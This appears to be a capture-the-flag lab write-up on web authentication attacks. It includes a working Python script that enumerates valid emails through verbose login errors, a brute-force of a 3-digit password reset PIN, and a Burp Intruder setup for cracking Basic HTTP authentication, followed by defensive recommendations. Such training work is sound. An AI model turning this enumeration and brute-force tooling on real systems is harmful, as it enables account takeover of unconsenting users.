Project Objective
Conduct comprehensive analysis of authentication mechanism vulnerabilities in web applications, develop and apply tools for identifying valid users, exploiting weaknesses in password reset logic, and cracking basic HTTP authentication.

Methodology and Implementation
1. Authentication Enumeration Vulnerability Analysis
Task: Identifying information leaks through verbose errors in login mechanisms.

Implementation: Developed Python script for automated enumeration of valid email addresses:

python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    valid_emails = enumerate_emails(email_file)
    
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
Result: Discovered valid email: canderson@gmail.com

2. Exploitation of Vulnerable Password Reset Logic
Problem: Use of predictable password reset tokens (3-digit numeric PIN codes).

Exploitation Method:

Initiated password reset request for admin@admin.com

Captured HTTP request using Burp Suite

Conducted brute force attack with range 100-200

Identified valid token

Result: Obtained flag THM{50_pr3d1ct4BL333!!}

3. Cracking Basic HTTP Authentication
Vulnerability: Weak resistance to brute force attacks.

Attack Implementation:

python
 Burp Intruder configuration for brute force:
 Payload Type: Simple list
 Wordlist: 500-worst-passwords.txt
  Payload Processing:
   1. Adding prefix "admin:"
   2. Base64 encoding
   3. Removing padding characters "="
Result: Successfully cracked password, obtained flag THM{b4$$1C_AuTTHHH}

Key Findings
Technical Discoveries:
Verbose Errors represent critical threat - reveal information about existing users

Predictable tokens in password reset mechanisms reduce entropy to unacceptable levels

Basic HTTP authentication is vulnerable to brute force without additional protection mechanisms

Security Recommendations:
Implement unified authentication error messages

Use cryptographically secure token generators

Deploy rate limiting and account lockout mechanisms

Transition to more secure authentication methods (OAuth, JWT)

Ethical Aspects:
All tests were conducted in a controlled learning environment with explicit permission from system owners. In production environments, such tests require formal authorization and adherence to responsible disclosure principles.

This project demonstrates the importance of a comprehensive approach to authentication mechanism security and the necessity of regular web application audits for the identified vulnerabilities.
